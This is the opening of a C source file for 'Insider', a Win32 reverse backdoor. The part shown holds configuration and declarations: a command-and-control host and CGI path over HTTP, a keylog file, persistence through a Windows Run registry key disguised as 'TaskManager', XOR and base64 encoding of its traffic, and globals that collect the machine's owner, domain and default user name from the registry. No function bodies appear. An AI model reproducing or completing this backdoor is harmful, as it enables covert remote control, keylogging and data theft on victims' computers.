

/* Insider -- Win32 reverse backdoor */



/* Comment prefix */
#define PREFIX		"StartJavaScript="

/* Encoding password */
#define ENCODE		1
#define PASSWORD	"MyPassword"

/* Debug ? */
#define DEBUG		0
#define LOGFILE		"C:\\wintask.log"

/* Default host and port */
#define HOST    	"someserver.com"
#define PORT    	80

/* Base URL */
#define URL		"/cgi-bin/cc.cgi"

/* Keylog file */
#define	KEYLOG		"C:\\wintask.dat"

/* Min time */
#define MIN		60

/* Max time */
#define MAX		300

/* Initial sleep time */
#define INITIAL		300

/* Default startup directory */
#define	STARTDIR	"C:\\"

/* Uninstallation registry parameters */
#define REGHIVE		HKEY_LOCAL_MACHINE
#define REGKEY		"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGVAL		"TaskManager"

/* Default proxy host and port */
#define PROXY_HOST    	""
#define PROXY_PORT    	8080

/* http methods */
#define HTTP_METHOD_GET		1
#define HTTP_METHOD_POST 	2

/* Program version */
#define	VERSION		"2.3.0"



/* Includes */

#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <errno.h>
#include <process.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <io.h>




/* Global variables */

/* proxy */
char *p_char;
int p_flag;

/* Hostname */
char *h_char;
int h_flag;

/* URL */
char *url;

/* Idle time */
int i_flag;
int max;
int min;

/* Current directory */
char *cdir;

/* Information string */
char *info;

/* Encoding password */
int encode;
char *passwd;

/* Ecoding buffer len */
int used;

/* HTTP reply data len and status */
int http_len;
int http_status;

/* Debug */
int debug;
FILE *dt;

/* Retry after authentication dialog */
int retry;

/* Keylogging */
HANDLE KeyCapThread;
int Logging;
char *keylogfile;
HMODULE Module;

/* Security descriptors */
SECURITY_ATTRIBUTES sa;
SECURITY_DESCRIPTOR sd;



/* Windows registry keys */

char *Identity;
/* HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CurrentVersion\ */
/* CSDVersion */
char *SP;
/* RegisteredOwner */
char *Owner;
/* ProductName */
char *Product;
/* RegisteredOrganization */
char *Organization;
/* HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\Winlogon\ */
/* DefaultUserName */
char *User_name;
/* DefaultDomainName */
char *Domain_name;
/* HKEY_CURRENT_USER\Control Panel\International\ */
/* sCountry */
char *Country;
/* UserAgent */
char *User_agent;



/* Global functions */

char *send_msg (char *, char *, char *, int, int);
char *b64dec(const unsigned char *, int);
char *b64enc(const unsigned char *, int);
void xor(char *);
char *getcd(char *);
void simplify_path(char *);
